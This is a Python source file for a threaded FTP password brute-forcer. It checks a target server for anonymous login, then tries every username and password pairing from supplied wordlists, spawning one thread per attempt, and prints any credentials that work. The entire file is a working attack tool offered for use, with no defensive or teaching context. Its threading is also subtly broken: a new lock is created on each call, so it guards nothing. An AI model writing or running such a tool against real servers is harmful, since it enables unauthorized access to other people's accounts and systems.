# -*- coding: utf-8 -*-
# Coded by Mine_Bit[BrainHands]
# brainhands.ru
# mine_bit@brainhands.ru

import threading
import time
import random
import sys
import ftplib
from ftplib import FTP
from copy import copy


def Start(server_in,userlist_in,wordlist_in):
    try:
        users = open(userlist_in, "r").readlines()
    except(IOError):
        print('Error: Check your userlist path')
        sys.exit(1)

    try:
        words = open(wordlist_in, "r").readlines()
    except(IOError):
        print('Error: Check your wordlist path')
        sys.exit(1)
    print('Параметры:')
    print('[+] Server:', server_in)
    print('[+] Users Loaded:', len(users))
    print('[+] Words Loaded:', len(words))

    f = FTP(server_in)
    print('[+] Response:', f.getwelcome())

    try:
        print('[+] Checking for anonymous login')
        ftp = FTP(server_in)
        ftp.login()
        ftp.retrlines('LIST')
        print('Anonymous login successful!!!')
        ftp.quit()
    except (ftplib.all_errors):
        print('Anonymous login unsuccessful!')
    wordlist = copy(words)


    def reloader():
        for word in wordlist:
            words.append(word)


    def getword():
        lock = threading.Lock()
        lock.acquire()
        if len(words) != 0:
            value = random.sample(words, 1)
            words.remove(value[0])
        else:
            print('Reloading Wordlist - Changing User!')
            reloader()
            value = random.sample(words, 1)
            users.remove(users[0])

        lock.release()
        if len(users) == 1:
            return value[0][:-1], users[0]
        else:
            return value[0][:-1], users[0][:-1]

    class Worker(threading.Thread):
        def run(self):
            value, user = getword()
            try:
                print('-' * 12)
                print('User:', user,'Password:', value)
                ftp = FTP(server_in)
                ftp.login(user, value)
                ftp.retrlines('LIST')
                print('Login successful:', value, user)
                ftp.quit()
                work.join()
                sys.exit(2)
            except (ftplib.all_errors) as msg:
                # print "An error occurred:", msg
                pass


    for i in range(len(words) * len(users)):
        work = Worker()
        work.start()
        time.sleep(1)
